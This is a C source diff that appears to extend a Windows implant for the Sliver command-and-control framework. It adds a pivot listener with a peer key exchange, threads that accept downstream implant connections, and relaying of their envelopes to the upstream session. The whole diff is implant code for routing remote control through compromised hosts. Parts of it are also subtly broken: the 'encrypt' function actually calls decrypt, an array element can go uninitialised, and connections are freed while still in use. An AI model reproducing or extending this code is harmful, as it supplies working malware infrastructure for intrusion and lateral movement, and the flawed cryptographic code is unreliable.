@@ -2,7 +2,8 @@
 
 PBUFFER MarshalPivotHello
 (
-	PGLOBAL_CONFIG pGlobalConfig
+	_In_ PGLOBAL_CONFIG pGlobalConfig,
+	_In_ PBUFFER pSessionKey
 )
 {
 	PPBElement Elements[4];
@@ -13,6 +14,9 @@ PBUFFER MarshalPivotHello
 	Elements[0] = CreateBytesElement(pGlobalConfig->lpPeerPubKey, lstrlenA(pGlobalConfig->lpPeerPubKey), 1);
 	Elements[1] = CreateVarIntElement(pGlobalConfig->uPeerID, 2);
 	Elements[2] = CreateBytesElement(pGlobalConfig->lpPeerAgePublicKeySignature, lstrlenA(pGlobalConfig->lpPeerAgePublicKeySignature), 3);
+	if (pSessionKey != NULL) {
+		Elements[3] = CreateBytesElement(pSessionKey->pBuffer, pSessionKey->cbBuffer, 4);
+	}
 
 	pFinalElement = CreateStructElement(Elements, _countof(Elements), 0);
 	pResult = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
@@ -54,7 +58,7 @@ PPIVOT_HELLO UnmarshalPivotHello
 	return pResult;
 }
 
-PPIVOT_PEER_ENVELOPE UnmarhsalPivotPeerEnvelope
+PPIVOT_PEER_ENVELOPE UnmarshalPivotPeerEnvelope
 (
 	_In_ PBUFFER pInput
 )
@@ -139,17 +143,17 @@ VOID FreePivotListener
 )
 {
 	DWORD i = 0;
+	PPIVOT_CONNECTION pConnection = NULL;
 
 	if (pPivoListener != NULL) {
 		FREE(pPivoListener->lpBindAddress);
-		if (pPivoListener->hEvent != NULL) {
-			CloseHandle(pPivoListener->hEvent);
-		}
-
 		for (i = 0; i < pPivoListener->dwNumberOfConnections; i++) {
-
+			pConnection = pPivoListener->Connections[i];
+			pConnection->IsExiting = TRUE;
+			pPivoListener->Connections[i] = NULL;
 		}
 
+		FREE(pPivoListener->Connections);
 		if (pPivoListener->dwType == PivotType_TCP) {
 			closesocket((SOCKET)pPivoListener->ListenHandle);
 		}
@@ -158,7 +162,7 @@ VOID FreePivotListener
 	}
 }
 
-PBUFFER MarhsalPivotPeerEnvelope
+PBUFFER MarshalPivotPeerEnvelope
 (
 	_In_ PPIVOT_PEER_ENVELOPE pEnvelope
 )
@@ -249,4 +253,178 @@ PBUFFER AgeDecryptFromPeer
 	}
 
 	return AgeDecrypt(pConfig->lpPeerPrivKey, pCiphertext);
+}
+
+PBUFFER AgeEncryptToPeer
+(
+	_In_ PGLOBAL_CONFIG pConfig,
+	_In_ PBUFFER pRecipientPublicKey,
+	_In_ LPSTR lpRecipientPublicKeySig,
+	_In_ PBUFFER pPlaintext
+)
+{
+	if (!MinisignVerify(pRecipientPublicKey, lpRecipientPublicKeySig, pConfig->lpServerMinisignPublicKey)) {
+		return NULL;
+	}
+
+	return AgeDecrypt(pConfig->lpPeerPrivKey, pPlaintext);
+}
+
+BOOL PeerKeyExchange
+(
+	_In_ PPIVOT_CONNECTION pConnection
+)
+{
+	LPVOID lpClient = NULL;
+	PBUFFER pPeerHelloRaw = NULL;
+	PPIVOT_HELLO pPivotHello = NULL;
+	BOOL Result = FALSE;
+	PGLOBAL_CONFIG pConfig = NULL;
+	PBYTE pSessionKey = NULL;
+	BUFFER TempBuffer;
+	PBUFFER pCiphertext = NULL;
+	PBUFFER MarshaledPivotHello = NULL;
+
+	lpClient = pConnection->lpDownstreamConn;
+	pConfig = pConnection->pListener->pConfig;
+	pPeerHelloRaw = pConnection->pListener->RawRecv(lpClient);
+	if (pPeerHelloRaw == NULL) {
+		goto CLEANUP;
+	}
+
+	pPivotHello = UnmarshalPivotHello(pPeerHelloRaw);
+	if (!MinisignVerify(pPivotHello->pPublicKey, pPivotHello->lpPublicKeySignature, pConfig->lpServerMinisignPublicKey)) {
+		goto CLEANUP;
+	}
+
+	pConnection->uDownstreamPeerID = pPivotHello->uPeerID;
+	pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
+	memcpy(pConnection->SessionKey, pSessionKey, sizeof(pConnection->SessionKey));
+	TempBuffer.pBuffer = pSessionKey;
+	TempBuffer.cbBuffer = CHACHA20_KEY_SIZE;
+	pCiphertext = AgeEncryptToPeer(pConfig, pPivotHello->pPublicKey, pPivotHello->lpPublicKeySignature, &TempBuffer);
+	MarshaledPivotHello = MarshalPivotHello(pConfig, pCiphertext);
+	if (!pConnection->pListener->RawSend(lpClient, MarshaledPivotHello)) {
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	FreeBuffer(pPeerHelloRaw);
+	FreeBuffer(pCiphertext);
+	FreeBuffer(MarshaledPivotHello);
+	FreePivotHello(pPivotHello);
+	FREE(pSessionKey);
+
+	return Result;
+}
+
+VOID FreePivotConnection
+(
+	_In_ PPIVOT_CONNECTION pConnection
+)
+{
+	if (pConnection != NULL) {
+		FREE(pConnection);
+	}
+}
+
+VOID PivotConnectionStart
+(
+	_In_ PPIVOT_CONNECTION pConnection
+)
+{
+	PPIVOT_LISTENER pListener = NULL;
+	PGLOBAL_CONFIG pConfig = NULL;
+	PENVELOPE pEnvelope = NULL;
+	PENVELOPE pSendEnvelope = NULL;
+	PPIVOT_PEER_ENVELOPE pPeerEnvelope = NULL;
+	PPIVOT_PEER pNewPeer = NULL;
+	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+
+	if (!PeerKeyExchange(pConnection)) {
+		goto CLEANUP;
+	}
+
+	pListener = pConnection->pListener;
+	pConfig = pListener->pConfig;
+	pListener->Connections[pListener->dwNumberOfConnections++] = pConnection;
+	while (TRUE) {
+		if (pConnection->IsExiting) {
+			goto CLEANUP;
+		}
+
+		if (pEnvelope != NULL) {
+			FreeEnvelope(pEnvelope);
+			pEnvelope = NULL;
+		}
+
+		pEnvelope = pListener->RecvEnvelope(pConfig, pConnection->lpDownstreamConn);
+		if (pEnvelope == NULL) {
+			continue;
+		}
+
+		if (pEnvelope->uType == MsgPivotPeerPing) {
+			pSendEnvelope = ALLOC(sizeof(ENVELOPE));
+			pSendEnvelope->uType = MsgPivotPeerPing;
+			pSendEnvelope->pData = pEnvelope->pData;
+			pEnvelope->pData = NULL;
+			pListener->SendEnvelope(pConfig, pConnection->lpDownstreamConn, pSendEnvelope);
+			FreeEnvelope(pSendEnvelope);
+			//= MarshalEnvelope()
+		}
+		else if (pEnvelope->uType == MsgPivotPeerEnvelope) {
+			pPeerEnvelope = UnmarshalPivotPeerEnvelope(pEnvelope->pData);
+			if (pPeerEnvelope == NULL) {
+				continue;
+			}
+
+			pPeerEnvelope->PivotPeers = REALLOC(pPeerEnvelope->PivotPeers, sizeof(PPIVOT_PEER) * (pPeerEnvelope->cPivotPeers + 1));
+			pNewPeer = ALLOC(sizeof(PIVOT_PEER));
+			pNewPeer->lpName = DuplicateStrA(pConfig->szSliverName, 0);
+			pNewPeer->uPeerID = pConfig->uPeerID;
+			pPeerEnvelope->PivotPeers[pPeerEnvelope->cPivotPeers++] = pNewPeer;
+
+			pSendEnvelope = ALLOC(sizeof(ENVELOPE));
+			pSendEnvelope->uType = MsgPivotPeerEnvelope;
+			pSendEnvelope->pData = MarshalPivotPeerEnvelope(pPeerEnvelope);
+			pSessionClient = (PSLIVER_SESSION_CLIENT)pListener->lpUpstream;
+			pSessionClient->Send(pConfig, pSessionClient->lpClient, pSendEnvelope);
+			FreeEnvelope(pSendEnvelope);
+			FreePivotPeerEnvelope(pPeerEnvelope);
+		}
+	}
+
+CLEANUP:
+	if (pEnvelope != NULL) {
+		FreeEnvelope(pEnvelope);
+		pEnvelope = NULL;
+	}
+
+	FreePivotConnection(pConnection);
+	return;
+}
+
+VOID ListenerMainLoop
+(
+	_In_ PPIVOT_LISTENER pListener
+)
+{
+	PPIVOT_CONNECTION pNewConnection = NULL;
+
+	while (TRUE) {
+		if (pListener->IsExiting) {
+			goto CLEANUP;
+		}
+
+		pNewConnection = pListener->Accept(pListener);
+		if (pNewConnection == NULL) {
+			continue;
+		}
+
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PivotConnectionStart, (LPVOID)pNewConnection, 0, NULL);
+	}
+
+CLEANUP:
+	FreePivotListener(pListener);
 }
